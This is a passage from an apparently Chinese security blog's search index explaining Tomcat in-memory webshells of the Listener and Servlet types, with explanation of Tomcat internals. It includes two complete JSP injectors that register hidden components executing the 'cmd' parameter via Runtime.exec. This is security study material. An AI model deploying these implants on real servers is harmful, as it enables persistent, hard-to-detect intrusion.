:","title":"Listener\u6d41\u7a0b\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/#\u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790","text":"\u6839\u636e\u4e0a\u9762\u7684\u5206\u6790\u6211\u4eec\u77e5\u9053Listener\u6765\u6e90\u4e8etomcat\u521d\u59cb\u5316\u65f6\u4eceweb.xml\u5b9e\u4f8b\u5316\u7684Listener\u548capplicationEventListenersList\u4e2d\u7684Listener\uff0c\u524d\u8005\u6211\u4eec\u65e0\u6cd5\u63a7\u5236\uff0c\u4f46\u662f\u540e\u8005\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\uff0c\u53ea\u9700\u8981\u5f80applicationEventListenersList\u4e2d\u52a0\u5165\u6211\u4eec\u7684\u6076\u610fListener\u5373\u53ef\u3002 \u5b9e\u9645\u4e0aStandardContext\u5b58\u5728 addApplicationEventListener() \u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u7ed9\u6211\u4eec\u8c03\u7528\uff0c\u5f80applicationEventListenersList\u4e2d\u52a0\u5165Listener\u3002 \u6240\u4ee5\u6211\u4eec\u7684Listener\u5185\u5b58\u9a6c\u5b9e\u73b0\u6b65\u9aa4: - \u7ee7\u627f\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610fListener - \u83b7\u53d6StandardContext - \u8c03\u7528 StandardContext.addApplicationEventListener() \u6dfb\u52a0\u6076\u610fListener \u4ee5\u4e0b\u662f\u4ee3\u7801\u7684\u5177\u4f53\u5b9e\u73b0: <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"javax.servlet.*\" %> <%@ page import=\"javax.servlet.annotation.WebServlet\" %> <%@ page import=\"javax.servlet.http.HttpServlet\" %> <%@ page import=\"javax.servlet.http.HttpServletRequest\" %> <%@ page import=\"javax.servlet.http.HttpServletResponse\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"java.lang.reflect.Field\" %> <% class S implements ServletRequestListener{ @Override public void requestDestroyed(ServletRequestEvent servletServletRequestListenerRequestEvent) { } @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmd = servletRequestEvent.getServletRequest().getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } } %> <% ServletContext servletContext = request.getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); S servletRequestListener = new S(); standardContext.addApplicationEventListener(servletRequestListener); out.println(\"inject success\"); %>","title":"\u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/","tags":["java","java\u5b89\u5168","\u5185\u5b58\u9a6c"],"text":"Tomcat-Servlet\u578b\u5185\u5b58\u9a6c # \u53c2\u8003\u6587\u7ae0 # https://blog.csdn.net/angry_program/article/details/118492214 https://www.jianshu.com/p/ed74f6e1cbdb Tomcat\u4e0eServlet # \u8981\u60f3\u4e86\u89e3\u5982\u4f55\u52a8\u6001\u6ce8\u518cServlet\uff0c\u6211\u4eec\u9700\u8981\u5bf9tomcat\u6709\u4e00\u4e2a\u66f4\u597d\u7684\u8ba4\u8bc6: Tomcat \u670d\u52a1\u5668\u662f\u4e00\u4e2a\u514d\u8d39\u7684\u5f00\u653e\u6e90\u4ee3\u7801\u7684Web \u5e94\u7528\u670d\u52a1\u5668\uff0cTomcat\u662fApache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\uff08Apache Software Foundation\uff09\u7684Jakarta \u9879\u76ee\u4e2d\u7684\u4e00\u4e2a\u6838\u5fc3\u9879\u76ee\uff0c\u5b83\u65e9\u671f\u7684\u540d\u79f0\u4e3acatalina\uff0c\u540e\u6765\u7531Apache\u3001Sun \u548c\u5176\u4ed6\u4e00\u4e9b\u516c\u53f8\u53ca\u4e2a\u4eba\u5171\u540c\u5f00\u53d1\u800c\u6210\uff0c\u5e76\u66f4\u540d\u4e3aTomcat\u3002Tomcat \u662f\u4e00\u4e2a\u5c0f\u578b\u7684\u8f7b\u91cf\u7ea7\u5e94\u7528\u670d\u52a1\u5668\uff0c\u5728\u4e2d\u5c0f\u578b\u7cfb\u7edf\u548c\u5e76\u53d1\u8bbf\u95ee\u7528\u6237\u4e0d\u662f\u5f88\u591a\u7684\u573a\u5408\u4e0b\u88ab\u666e\u904d\u4f7f\u7528\uff0c\u662f\u5f00\u53d1\u548c\u8c03\u8bd5JSP \u7a0b\u5e8f\u7684\u9996\u9009\uff0c\u56e0\u4e3aTomcat \u6280\u672f\u5148\u8fdb\u3001\u6027\u80fd\u7a33\u5b9a\uff0c\u6210\u4e3a\u76ee\u524d\u6bd4\u8f83\u6d41\u884c\u7684Web \u5e94\u7528\u670d\u52a1\u5668\u3002Tomcat\u662f\u5e94\u7528\uff08java\uff09\u670d\u52a1\u5668\uff0c\u5b83\u53ea\u662f\u4e00\u4e2aservlet\u5bb9\u5668\uff0c\u662fApache\u7684\u6269\u5c55\uff0c\u4f46\u5b83\u662f\u72ec\u7acb\u8fd0\u884c\u7684\u3002 Tomcat\u7531\u56db\u5927\u5bb9\u5668\u7ec4\u6210\uff0c\u5206\u522b\u662fEngine\u3001Host\u3001Context\u3001Wrapper\u3002\u8fd9\u56db\u4e2a\u7ec4\u4ef6\u662f\u8d1f\u8d23\u5173\u7cfb\uff0c\u5b58\u5728\u5305\u542b\u5173\u7cfb\u3002\u53ea\u5305\u542b\u4e00\u4e2a\u5f15\u64ce\uff08Engine\uff09\uff1a Engine\uff08\u5f15\u64ce\uff09\uff1a\u8868\u793a\u53ef\u8fd0\u884c\u7684Catalina\u7684servlet\u5f15\u64ce\u5b9e\u4f8b\uff0c\u5e76\u4e14\u5305\u542b\u4e86servlet\u5bb9\u5668\u7684\u6838\u5fc3\u529f\u80fd\u3002\u5728\u4e00\u4e2a\u670d\u52a1\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u5f15\u64ce\u3002\u540c\u65f6\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u771f\u6b63\u7684\u5bb9\u5668\uff0cEngine\u5143\u7d20\u4e4b\u4e0b\u53ef\u4ee5\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u865a\u62df\u4e3b\u673a\u3002\u5b83\u4e3b\u8981\u529f\u80fd\u662f\u5c06\u4f20\u5165\u8bf7\u6c42\u59d4\u6258\u7ed9\u9002\u5f53\u7684\u865a\u62df\u4e3b\u673a\u5904\u7406\u3002\u5982\u679c\u6839\u636e\u540d\u79f0\u6ca1\u6709\u627e\u5230\u53ef\u5904\u7406\u7684\u865a\u62df\u4e3b\u673a\uff0c\u90a3\u4e48\u5c06\u6839\u636e\u9ed8\u8ba4\u7684Host\u6765\u5224\u65ad\u8be5\u7531\u54ea\u4e2a\u865a\u62df\u4e3b\u673a\u5904\u7406\u3002 Host \uff08\u865a\u62df\u4e3b\u673a\uff09\uff1a\u4f5c\u7528\u5c31\u662f\u8fd0\u884c\u591a\u4e2a\u5e94\u7528\uff0c\u5b83\u8d1f\u8d23\u5b89\u88c5\u548c\u5c55\u5f00\u8fd9\u4e9b\u5e94\u7528\uff0c\u5e76\u4e14\u6807\u8bc6\u8fd9\u4e2a\u5e94\u7528\u4ee5\u4fbf\u80fd\u591f\u533a\u5206\u5b83\u4eec\u3002\u5b83\u7684\u5b50\u5bb9\u5668\u901a\u5e38\u662f Context\u3002\u4e00\u4e2a\u865a\u62df\u4e3b\u673a\u4e0b\u90fd\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u6216\u8005\u591a\u4e2aWeb App\uff0c\u6bcf\u4e2aWeb App\u5bf9\u5e94\u4e8e\u4e00\u4e2aContext\uff0c\u5f53Host\u83b7\u5f97\u4e00\u4e2a\u8bf7\u6c42\u65f6\uff0c\u5c06\u628a\u8be5\u8bf7\u6c42\u5339\u914d\u5230\u67d0\u4e2aContext\u4e0a\uff0c\u7136\u540e\u628a\u8be5\u8bf7\u6c42\u4ea4\u7ed9\u8be5Context\u6765\u5904\u7406\u3002\u4e3b\u673a\u7ec4\u4ef6\u7c7b\u4f3c\u4e8eApache\u4e2d\u7684\u865a\u62df\u4e3b\u673a\uff0c\u4f46\u5728Tomcat\u4e2d\u53ea\u652f\u6301\u57fa\u4e8eFQDN(\u5b8c\u5168\u5408\u683c\u7684\u4e3b\u673a\u540d)\u7684\u201c\u865a\u62df\u4e3b\u673a\u201d\u3002Host\u4e3b\u8981\u7528\u6765\u89e3\u6790web.xml Context\uff08\u4e0a\u4e0b\u6587\uff09\uff1a\u4ee3\u8868 Servlet \u7684 Context\uff0c\u5b83\u5177\u5907\u4e86 Servlet \u8fd0\u884c\u7684\u57fa\u672c\u73af\u5883\uff0c\u5b83\u8868\u793aWeb\u5e94\u7528\u7a0b\u5e8f\u672c\u8eab\u3002Context \u6700\u91cd\u8981\u7684\u529f\u80fd\u5c31\u662f\u7ba1\u7406\u5b83\u91cc\u9762\u7684 Servlet \u5b9e\u4f8b\uff0c\u4e00\u4e2aContext\u4ee3\u8868\u4e00\u4e2aWeb\u5e94\u7528\uff0c\u4e00\u4e2aWeb\u5e94\u7528\u7531\u4e00\u4e2a\u6216\u8005\u591a\u4e2aServlet\u5b9e\u4f8b\u7ec4\u6210\u3002 Wrapper\uff08\u5305\u88c5\u5668\uff09\uff1a\u4ee3\u8868\u4e00\u4e2a Servlet\uff0c\u5b83\u8d1f\u8d23\u7ba1\u7406\u4e00\u4e2a Servlet\uff0c\u5305\u62ec\u7684 Servlet \u7684\u88c5\u8f7d\u3001\u521d\u59cb\u5316\u3001\u6267\u884c\u4ee5\u53ca\u8d44\u6e90\u56de\u6536\u3002Wrapper \u662f\u6700\u5e95\u5c42\u7684\u5bb9\u5668\uff0c\u5b83\u6ca1\u6709\u5b50\u5bb9\u5668\u4e86\uff0c\u6240\u4ee5\u8c03\u7528\u5b83\u7684 addChild \u5c06\u4f1a\u62a5\u9519\u3002 \u5176\u4e2dwebapps\u6587\u4ef6\u5939\u5373\u662f\u6211\u4eec\u7684Host\uff0cwebapps\u4e2d\u7684\u6587\u4ef6\u5939(\u5982examples/ROOT)\u4ee3\u8868\u4e00\u4e2aContext\uff0c\u6bcf\u4e2aContext\u5185\u5305\u542bWrapper\uff0cWrapper \u5219\u8d1f\u8d23\u7ba1\u7406\u5bb9\u5668\u5185\u7684 Servlet\u3002 \u5b9e\u9645\u4e0a\uff0c\u5728Tomcat7\u4e4b\u540e\u7684\u7248\u672c\uff0cStandardContext\u4e2d\u63d0\u4f9b\u4e86\u52a8\u6001\u6ce8\u518cServlet\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u672a\u5b9e\u73b0: \u6240\u4ee5\u6211\u4eec\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u52a8\u6001\u6dfb\u52a0Servlet\u7684\u529f\u80fd\uff0c\u5728\u6b64\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4e86\u89e3Servlet\u7684\u751f\u547d\u5468\u671f(\u4e3b\u8981\u5173\u6ce8\u521d\u59cb\u5316\u548c\u88c5\u8f7d)\u3002 Servlet\u521d\u59cb\u5316\u6d41\u7a0b\u5206\u6790 # \u5728 org.apache.catalina.core.StandardWrapper#setServletClass() \u5904\u4e0b\u65ad\u70b9\u8c03\u8bd5\uff0c\u56de\u6eaf\u5230\u4e0a\u4e00\u5c42\u7684 ContextConfig.configureConetxt() : \u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5f88\u6e05\u695a\u5730\u770b\u5230Wrapper\u7684\u521d\u59cb\u5316\u6d41\u7a0b\uff0c\u9996\u5148\u8c03\u7528\u521b\u5efa\u4e86wrapper\uff0c\u7136\u540e\u8c03\u7528set\u65b9\u6cd5\u914d\u7f6ewrapper\u76f8\u5173\u7684\u5c5e\u6027\uff0c\u6211\u4eec\u53ef\u4ee5\u53c2\u8003web.xml\u4e2d\u9700\u8981\u914d\u7f6e\u7684\u5c5e\u6027\u6765\u63a8\u6d4bwrapper\u7684\u5173\u952e\u5c5e\u6027(\u5373\u56fe\u4e2d\u7ea2\u6846)\uff0c\u9700\u8981\u7559\u610f\u7684\u4e00\u4e2a\u7279\u6b8a\u5c5e\u6027\u662fload-on-startup\u5c5e\u6027\uff0c\u5b83\u662f\u4e00\u4e2a\u542f\u52a8\u4f18\u5148\u7ea7\uff0c\u540e\u7eed\u518d\u5206\u6790: \u63a5\u7740\u7ee7\u7eed\u914d\u7f6ewrapper\u7684servletClass: \u914d\u7f6e\u5b8c\u6210\u4e4b\u540e\u4f1a\u5c06wrapper\u653e\u5165StandardContext\u7684child\u91cc: \u63a5\u7740\u4f1a\u904d\u5386web.xml\u4e2dservlet-mapping\u7684servlet-name\u548c\u5bf9\u5e94\u7684url-pattern\uff0c\u8c03\u7528 StandardContext.addServletMappingDecoded() \u6dfb\u52a0servlet\u5bf9\u5e94\u7684\u6620\u5c04: \u603b\u7ed3\u4e00\u4e0b\uff0cServlet\u7684\u521d\u59cb\u5316\u4e00\u5171\u6709\u51e0\u4e2a\u6b65\u9aa4: 1. \u901a\u8fc7 context.createWapper() \u521b\u5efa Wapper \u5bf9\u8c61 2. \u8bbe\u7f6e Servlet \u7684 LoadOnStartUp \u7684\u503c(\u540e\u7eed\u5206\u6790\u4e3a\u4ec0\u4e48\u52a8\u6001\u6ce8\u518cServlet\u9700\u8981\u8bbe\u7f6e\u8be5\u5c5e\u6027) 3. \u8bbe\u7f6e Servlet \u7684 Name 4. \u8bbe\u7f6e Servlet \u5bf9\u5e94\u7684 Class 5. \u5c06 Servlet \u6dfb\u52a0\u5230 context \u7684 children \u4e2d 6. \u5c06 url \u8def\u5f84\u548c servlet \u7c7b\u505a\u6620\u5c04 Servlet\u88c5\u8f7d\u6d41\u7a0b\u5206\u6790 # \u5728 org.apache.catalina.core.StandardWapper#loadServlet() \u5904\u4e0b\u65ad\u70b9\u8c03\u8bd5\uff0c\u56de\u6eaf\u5230 StandardContext.startInternal() \u65b9\u6cd5: \u53ef\u4ee5\u770b\u5230\uff0c\u662f\u5728\u52a0\u8f7d\u5b8cListener\u548cFilter\u4e4b\u540e\uff0c\u624d\u88c5\u8f7dServlet: \u8fd9\u91cc\u8c03\u7528\u4e86 findChildren() \u65b9\u6cd5\u4eceStandardContext\u4e2d\u62ff\u5230\u6240\u6709\u7684child\u5e76\u4f20\u5230 loadOnStartUp() \u65b9\u6cd5\u5904\u7406\uff0c\u8ddf\u5230 loadOnstartup() \uff0c\u53ef\u4ee5\u6839\u636e\u4ee3\u7801\u548c\u6ce8\u91ca\u4e86\u89e3\u5230\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u5c06\u6240\u6709load-on-startup\u5c5e\u6027\u5927\u4e8e0\u7684wrapper\u52a0\u8f7d(\u53cd\u4e4b\u5219\u4e0d\u4f1a)\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u4e0a\u6587\u6211\u4eec\u63d0\u5230\u9700\u8981\u5173\u6ce8\u8fd9\u4e2a\u5c5e\u6027\u7684\u539f\u56e0: \u6839\u636e\u641c\u7d22\uff0c\u6211\u4eec\u4e86\u89e3\u5230load-on-startup\u5c5e\u6027\u7684\u4f5c\u7528: load-on-startup \u8fd9\u4e2a\u5143\u7d20\u7684\u542b\u4e49\u662f\u5728\u670d\u52a1\u5668\u542f\u52a8\u7684\u65f6\u5019\u5c31\u52a0\u8f7d\u8fd9\u4e2aservlet(\u5b9e\u4f8b\u5316\u5e76\u8c03\u7528init()\u65b9\u6cd5). \u8fd9\u4e2a\u5143\u7d20\u4e2d\u7684\u53ef\u9009\u5185\u5bb9\u5fc5\u987b\u4e3a\u4e00\u4e2a\u6574\u6570,\u8868\u660e\u4e86\u8fd9\u4e2aservlet\u88ab\u52a0\u8f7d\u7684\u5148\u540e\u987a\u5e8f. \u5f53\u662f\u4e00\u4e2a\u8d1f\u6570\u65f6\u6216\u8005\u6ca1\u6709\u6307\u5b9a\u65f6\uff0c\u5219\u8868\u793a\u670d\u52a1\u5668\u5728\u8be5servlet\u88ab\u8c03\u7528\u65f6\u624d\u52a0\u8f7d\u3002 \u53ef\u4ee5\u770b\u5230\u5f53\u672a\u8bbe\u7f6eload-on-startup\u5c5e\u6027\u662f\uff0ctomcat\u91c7\u7528\u7684\u662f\u4e00\u79cd\u61d2\u52a0\u8f7d\u7684\u673a\u5236\uff0c\u53ea\u6709servlet\u88ab\u8c03\u7528\u65f6\u624d\u4f1a\u52a0\u8f7d\u5230Context\u4e2d\u3002 \u7531\u4e8e\u6211\u4eec\u9700\u8981\u52a8\u6001\u6ce8\u518cServlet\uff0c\u4e3a\u4e86\u4f7f\u5176\u88ab\u52a0\u8f7d\uff0c\u6211\u4eec\u5fc5\u987b\u8bbe\u7f6eload-on-startup\u5c5e\u6027\u3002 \u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790 # \u6839\u636e\u4e0a\u8ff0\u7684\u6d41\u7a0b\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u6a21\u4eff\u4e0a\u8ff0\u7684\u52a0\u8f7d\u673a\u5236\u624b\u52a8\u6ce8\u518c\u4e00\u4e2aservlet: 1. \u627e\u5230StandardContext 2. \u7ee7\u627f\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610fservlet 3. \u901a\u8fc7 context.createWapper() \u521b\u5efa Wapper \u5bf9\u8c61 2. \u8bbe\u7f6e Servlet \u7684 LoadOnStartUp \u7684\u503c 3. \u8bbe\u7f6e Servlet \u7684 Name 4. \u8bbe\u7f6e Servlet \u5bf9\u5e94\u7684 Class 5. \u5c06 Servlet \u6dfb\u52a0\u5230 context \u7684 children \u4e2d 6. \u5c06 url \u8def\u5f84\u548c servlet \u7c7b\u505a\u6620\u5c04 \u4ee5\u4e0b\u662f\u4ee3\u7801\u7684\u5177\u4f53\u5b9e\u73b0: <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"javax.servlet.*\" %> <%@ page import=\"javax.servlet.annotation.WebServlet\" %> <%@ page import=\"javax.servlet.http.HttpServlet\" %> <%@ page import=\"javax.servlet.http.HttpServletRequest\" %> <%@ page import=\"javax.servlet.http.HttpServletResponse\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"org.apache.catalina.Wrapper\" %> <%@ page import=\"org.apache.catalina.connector.Request\" %> <% class S implements Servlet{ @Override public void init(ServletConfig config) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { String cmd = req.getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } @Override public String getServletInfo() { return null; } @Override public void destroy() { } } %> <% // ServletContext servletContext = request.getServletContext(); // Field appctx = servletContext.getClass().getDeclaredField(\"context\"); // appctx.setAccessible(true); // ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); // Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); // stdctx.setAccessible(true); // StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); // \u66f4\u7b80\u5355\u7684\u65b9\u6cd5 \u83b7\u53d6StandardContext Field reqF = request.getClass().getDeclaredField(\"request\"); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext standardContext = (StandardContext) req.getContext(); S servlet = new S(); String name = servlet.getClass().getSimpleName(); Wrapper newWrapper = standardContext.createWrapper(); newWrapper.setName(name); newWrapper.setLoadOnStartup(1); newWrapper.setServlet(servlet); newWrapper.setServletClass(servlet.getClass().getName()); standardContext.addChild(newWrapper); standardContext.addServletMappingDecoded(\"/longlone\", name); out.println(\"inject success\"); %> \u4f18\u7f3a\u70b9\u5206\u6790 # \u7f3a\u70b9: - \u8fd9\u79cd\u7c7b\u578b\u7684\u5185\u5b58\u9a6c\u9700\u8981\u8bbf\u95ee\u5177\u4f53\u8def\u5f84\u624d\u80fd\u591f\u547d\u4ee4\u6267\u884c\uff0c\u65e5\u5fd7\u4e2d\u6bd4\u8f83\u5bb9\u6613\u88ab\u53d1\u73b0 \u4f18\u70b9: - \u517c\u5bb9\u6027\u5f3a\uff0c\u517c\u5bb9tomcat7","title":"Tomcat-Servlet\u578b\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#tomcat-servlet\u578b\u5185\u5b58\u9a6c","text":"","title":"Tomcat-Servlet\u578b\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#\u53c2\u8003\u6587\u7ae0","text":"https://blog.csdn.net/angry_program/article/details/118492214 https://www.jianshu.com/p/ed74f6e1cbdb","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#tomcat\u4e0eservlet","text":"\u8981\u60f3\u4e86\u89e3\u5982\u4f55\u52a8\u6001\u6ce8\u518cServlet\uff0c\u6211\u4eec\u9700\u8981\u5bf9tomcat\u6709\u4e00\u4e2a\u66f4\u597d\u7684\u8ba4\u8bc6: Tomcat \u670d\u52a1\u5668\u662f\u4e00\u4e2a\u514d\u8d39\u7684\u5f00\u653e\u6e90\u4ee3\u7801\u7684Web \u5e94\u7528\u670d\u52a1\u5668\uff0cTomcat\u662fApache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\uff08Apache Software Foundation\uff09\u7684Jakarta \u9879\u76ee\u4e2d\u7684\u4e00\u4e2a\u6838\u5fc3\u9879\u76ee\uff0c\u5b83\u65e9\u671f\u7684\u540d\u79f0\u4e3acatalina\uff0c\u540e\u6765\u7531Apache\u3001Sun \u548c\u5176\u4ed6\u4e00\u4e9b\u516c\u53f8\u53ca\u4e2a\u4eba\u5171\u540c\u5f00\u53d1\u800c\u6210\uff0c\u5e76\u66f4\u540d\u4e3aTomcat\u3002Tomcat \u662f\u4e00\u4e2a\u5c0f\u578b\u7684\u8f7b\u91cf\u7ea7\u5e94\u7528\u670d\u52a1\u5668\uff0c\u5728\u4e2d\u5c0f\u578b\u7cfb\u7edf\u548c\u5e76\u53d1\u8bbf\u95ee\u7528\u6237\u4e0d\u662f\u5f88\u591a\u7684\u573a\u5408\u4e0b\u88ab\u666e\u904d\u4f7f\u7528\uff0c\u662f\u5f00\u53d1\u548c\u8c03\u8bd5JSP \u7a0b\u5e8f\u7684\u9996\u9009\uff0c\u56e0\u4e3aTomcat \u6280\u672f\u5148\u8fdb\u3001\u6027\u80fd\u7a33\u5b9a\uff0c\u6210\u4e3a\u76ee\u524d\u6bd4\u8f83\u6d41\u884c\u7684Web \u5e94\u7528\u670d\u52a1\u5668\u3002Tomcat\u662f\u5e94\u7528\uff08java\uff09\u670d\u52a1\u5668\uff0c\u5b83\u53ea\u662f\u4e00\u4e2aservlet\u5bb9\u5668\uff0c\u662fApache\u7684\u6269\u5c55\uff0c\u4f46\u5b83\u662f\u72ec\u7acb\u8fd0\u884c\u7684\u3002 Tomcat\u7531\u56db\u5927\u5bb9\u5668\u7ec4\u6210\uff0c\u5206\u522b\u662fEngine\u3001Host\u3001Context\u3001Wrapper\u3002\u8fd9\u56db\u4e2a\u7ec4\u4ef6\u662f\u8d1f\u8d23\u5173\u7cfb\uff0c\u5b58\u5728\u5305\u542b\u5173\u7cfb\u3002\u53ea\u5305\u542b\u4e00\u4e2a\u5f15\u64ce\uff08Engine\uff09\uff1a Engine\uff08\u5f15\u64ce\uff09\uff1a\u8868\u793a\u53ef\u8fd0\u884c\u7684Catalina\u7684servlet\u5f15\u64ce\u5b9e\u4f8b\uff0c\u5e76\u4e14\u5305\u542b\u4e86servlet\u5bb9\u5668\u7684\u6838\u5fc3\u529f\u80fd\u3002\u5728\u4e00\u4e2a\u670d\u52a1\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u5f15\u64ce\u3002\u540c\u65f6\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u771f\u6b63\u7684\u5bb9\u5668\uff0cEngine\u5143\u7d20\u4e4b\u4e0b\u53ef\u4ee5\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u865a\u62df\u4e3b\u673a\u3002\u5b83\u4e3b\u8981\u529f\u80fd\u662f\u5c06\u4f20\u5165\u8bf7\u6c42\u59d4\u6258\u7ed9\u9002\u5f53\u7684\u865a\u62df\u4e3b\u673a\u5904\u7406\u3002\u5982\u679c\u6839\u636e\u540d\u79f0\u6ca1\u6709\u627e\u5230\u53ef\u5904\u7406\u7684\u865a\u62df\u4e3b\u673a\uff0c\u90a3\u4e48\u5c06\u6839\u636e\u9ed8\u8ba4\u7684Host\u6765\u5224\u65ad\u8be5\u7531\u54ea\u4e2a\u865a\u62df\u4e3b\u673a\u5904\u7406\u3002 Host \uff08\u865a\u62df\u4e3b\u673a\uff09\uff1a\u4f5c\u7528\u5c31\u662f\u8fd0\u884c\u591a\u4e2a\u5e94\u7528\uff0c\u5b83\u8d1f\u8d23\u5b89\u88c5\u548c\u5c55\u5f00\u8fd9\u4e9b\u5e94\u7528\uff0c\u5e76\u4e14\u6807\u8bc6\u8fd9\u4e2a\u5e94\u7528\u4ee5\u4fbf\u80fd\u591f\u533a\u5206\u5b83\u4eec\u3002\u5b83\u7684\u5b50\u5bb9\u5668\u901a\u5e38\u662f Context\u3002\u4e00\u4e2a\u865a\u62df\u4e3b\u673a\u4e0b\u90fd\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u6216\u8005\u591a\u4e2aWeb App\uff0c\u6bcf\u4e2aWeb App\u5bf9\u5e94\u4e8e\u4e00\u4e2aContext\uff0c\u5f53Host\u83b7\u5f97\u4e00\u4e2a\u8bf7\u6c42\u65f6\uff0c\u5c06\u628a\u8be5\u8bf7\u6c42\u5339\u914d\u5230\u67d0\u4e2aContext\u4e0a\uff0c\u7136\u540e\u628a\u8be5\u8bf7\u6c42\u4ea4\u7ed9\u8be5Context\u6765\u5904\u7406\u3002\u4e3b\u673a\u7ec4\u4ef6\u7c7b\u4f3c\u4e8eApache\u4e2d\u7684\u865a\u62df\u4e3b\u673a\uff0c\u4f46\u5728Tomcat\u4e2d\u53ea\u652f\u6301\u57fa\u4e8eFQDN(\u5b8c\u5168\u5408\u683c\u7684\u4e3b\u673a\u540d)\u7684\u201c\u865a\u62df\u4e3b\u673a\u201d\u3002Host\u4e3b\u8981\u7528\u6765\u89e3\u6790web.xml Context\uff08\u4e0a\u4e0b\u6587\uff09\uff1a\u4ee3\u8868 Servlet \u7684 Context\uff0c\u5b83\u5177\u5907\u4e86 Servlet \u8fd0\u884c\u7684\u57fa\u672c\u73af\u5883\uff0c\u5b83\u8868\u793aWeb\u5e94\u7528\u7a0b\u5e8f\u672c\u8eab\u3002Context \u6700\u91cd\u8981\u7684\u529f\u80fd\u5c31\u662f\u7ba1\u7406\u5b83\u91cc\u9762\u7684 Servlet \u5b9e\u4f8b\uff0c\u4e00\u4e2aContext\u4ee3\u8868\u4e00\u4e2aWeb\u5e94\u7528\uff0c\u4e00\u4e2aWeb\u5e94\u7528\u7531\u4e00\u4e2a\u6216\u8005\u591a\u4e2aServlet\u5b9e\u4f8b\u7ec4\u6210\u3002 Wrapper\uff08\u5305\u88c5\u5668\uff09\uff1a\u4ee3\u8868\u4e00\u4e2a Servlet\uff0c\u5b83\u8d1f\u8d23\u7ba1\u7406\u4e00\u4e2a Servlet\uff0c\u5305\u62ec\u7684 Servlet \u7684\u88c5\u8f7d\u3001\u521d\u59cb\u5316\u3001\u6267\u884c\u4ee5\u53ca\u8d44\u6e90\u56de\u6536\u3002Wrapper \u662f\u6700\u5e95\u5c42\u7684\u5bb9\u5668\uff0c\u5b83\u6ca1\u6709\u5b50\u5bb9\u5668\u4e86\uff0c\u6240\u4ee5\u8c03\u7528\u5b83\u7684 addChild \u5c06\u4f1a\u62a5\u9519\u3002 \u5176\u4e2dwebapps\u6587\u4ef6\u5939\u5373\u662f\u6211\u4eec\u7684Host\uff0cwebapps\u4e2d\u7684\u6587\u4ef6\u5939(\u5982examples/ROOT)\u4ee3\u8868\u4e00\u4e2aContext\uff0c\u6bcf\u4e2aContext\u5185\u5305\u542bWrapper\uff0cWrapper \u5219\u8d1f\u8d23\u7ba1\u7406\u5bb9\u5668\u5185\u7684 Servlet\u3002 \u5b9e\u9645\u4e0a\uff0c\u5728Tomcat7\u4e4b\u540e\u7684\u7248\u672c\uff0cStandardContext\u4e2d\u63d0\u4f9b\u4e86\u52a8\u6001\u6ce8\u518cServlet\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u672a\u5b9e\u73b0: 